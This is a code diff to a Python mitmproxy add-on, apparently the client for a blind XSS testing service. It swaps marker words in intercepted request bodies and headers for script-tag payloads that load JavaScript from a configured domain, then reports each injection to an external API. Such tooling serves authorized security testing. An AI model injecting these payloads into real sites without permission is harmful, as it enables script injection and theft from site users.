@@ -6,6 +6,11 @@ import random
 import string
 import base64
 
+def debugit( text ):
+    f = open( 'log.txt', 'a')
+    f.write( text + "\n" )
+    f.close()
+
 try:
     from html import escape as html_escape # python 3.x
 except ImportError:
@@ -18,7 +23,7 @@ try:
         settings = yaml.load(f)
 except IOError:
     print("Error reading config.yaml, have you created one? (Hint: Try "
-          "running ./generate_config.py)")
+            "running ./generate_config.py)")
     exit()
 
 futures_sess = FuturesSession()
@@ -45,23 +50,49 @@ def payload_id_to_payload( payload_id, payload_token ):
     else:
         return "\"><script src=https://" + settings["domain"] + '/' + payload_token + "></script>"
 
-def request(context, flow):
-    for keyword, payload_id in settings["xss_probe_settings"].iteritems():
-        if keyword in flow.request.content:
-            req_body, probe_ids = replace_probe_markers(
-                flow.request.content,
-                context
-            )
-            flow.request.content = req_body
-            flow.request.headers[bytes( "Content-Length" )] = bytes( str( len( flow.request.content ) ) ) # Bullshit to patch mitmproxy's lack of auto Content-Type updating
+def request( context, flow ):
+    probe_ids = []
 
-            for probe_id in probe_ids:
-                notify_probe_server({
-                    "request": get_full_http_request_text(flow.request),
-                    "owner_correlation_key": settings["owner_correlation_key"],
-                    "injection_key": probe_id
-                }, context)
+    # Replace all instances in HTTP body with probe markers
+    req_body, body_probe_ids = replace_with_probe_markers(
+            flow.request.content,
+            context,
+            [],
+            True,
+    )
+    flow.request.content = req_body
+    probe_ids += body_probe_ids
 
+    # Replace all instance in HTTP headers with probe markers
+    for header_key, header_value in flow.request.headers.iteritems():
+        new_header_key, header_key_probe_ids = replace_with_probe_markers(
+                header_key,
+                context,
+                [],
+                False,
+        )
+        probe_ids += header_key_probe_ids
+        flow.request.headers[ bytes( new_header_key ) ] = bytes( flow.request.headers[ header_key ] )
+        if len( header_key_probe_ids ) > 0:
+            del flow.request.headers[ bytes( header_key ) ]
+
+        new_header_value, header_value_probe_ids = replace_with_probe_markers(
+                header_value,
+                context,
+                [],
+                False,
+        )
+        probe_ids += header_value_probe_ids
+        flow.request.headers[ bytes( header_key ) ] = bytes( new_header_value )
+
+    flow.request.headers[bytes( "Content-Length" )] = bytes( str( len( flow.request.content ) ) ) # Bullshit to patch mitmproxy's lack of auto Content-Type updating
+
+    for probe_id in probe_ids:
+        notify_probe_server({
+            "request": get_full_http_request_text( flow.request ),
+            "owner_correlation_key": settings["owner_correlation_key"],
+            "injection_key": probe_id
+        }, context)
 
 def get_full_http_request_text(req):
     http_request_text = req.method + " " + req.path + " HTTP/1.1\r\n"
@@ -71,27 +102,29 @@ def get_full_http_request_text(req):
     http_request_text += req.body
     return http_request_text
 
-
-def replace_probe_markers(request_body, context):
-    probe_marker_list = []
-
+def replace_with_probe_markers(input_text, context, probe_marker_list, urlencoded):
+    # Iterate through all dummy words to see if we have a replacement to make
     for keyword, payload_id in settings["xss_probe_settings"].iteritems():
-        context.log( "Keyword: " + keyword )
-        if keyword in request_body:
-            context.log( "Checking for " + keyword + " in request body..." )
+        # Does this keyword exist in our text
+        if keyword in input_text:
             payload_token = get_random_id(10)
             payload = payload_id_to_payload( payload_id, payload_token )
-            context.log("[STATUS] Replacing '" + keyword + "' with " + payload)
-            request_body = request_body.replace( keyword, urllib.quote_plus( payload ), 1)
+
+            # URL encode if requested by caller
+            if urlencoded:
+                payload = urllib.quote_plus( payload )
+
+            input_text = input_text.replace( keyword, payload, 1)
             probe_marker_list.append( payload_token )
-            return request_body, probe_marker_list
+            return replace_with_probe_markers( input_text, context, probe_marker_list, urlencoded )
+    return input_text, probe_marker_list
 
 
 def notify_probe_server(request_details, context):
     fut = futures_sess.post(
-        "https://api.xsshunter.com/api/record_injection",
-        headers={"Accept": "application/json"},
-        json=request_details,
+            "https://api.xsshunter.com/api/record_injection",
+            headers={"Accept": "application/json"},
+            json=request_details,
     )
     fut.add_done_callback(lambda x: probe_sent_cb(x, context))
 
